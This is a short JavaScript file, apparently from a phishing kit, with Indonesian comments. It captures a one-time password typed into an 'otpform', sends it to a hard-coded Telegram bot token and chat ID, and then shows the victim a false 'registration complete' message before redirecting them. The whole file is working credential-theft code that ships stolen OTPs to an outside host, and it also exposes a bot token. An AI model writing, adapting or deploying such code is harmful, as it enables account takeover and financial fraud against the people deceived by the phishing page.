
document.getElementById('otpform').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah pengiriman formulir default

    const otp = document.getElementById('otp').value;

    const token = '8146809489:AAHBdy_PT-37bHmuAxlHyCnaPHZuZ7pxz0A'; // Ganti dengan token bot Anda
    const chatId = '5712482554'; // Ganti dengan ID chat Anda

    const text = `OTP: ${otp} `;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

    function gabungkanFungsi() {
        fetch(url)
            .then(response => {
                if (response.ok) {
                    alert('Pendaftaran selesai, silahkan KLIK SELANJUTNYA untuk verifikasi Akun');
                    document.getElementById('otpform').reset(); // Reset formulir
                    window.location.href = "Berhasil.html"; // Arahkan ke halaman otp.html
                } else {
                    alert('Terjadi kesalahan saat mengirim kode.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Terjadi kesalahan saat mengirim pesan.');
            });
    }

    // Panggil fungsi gabungan
    gabungkanFungsi();
});


   



   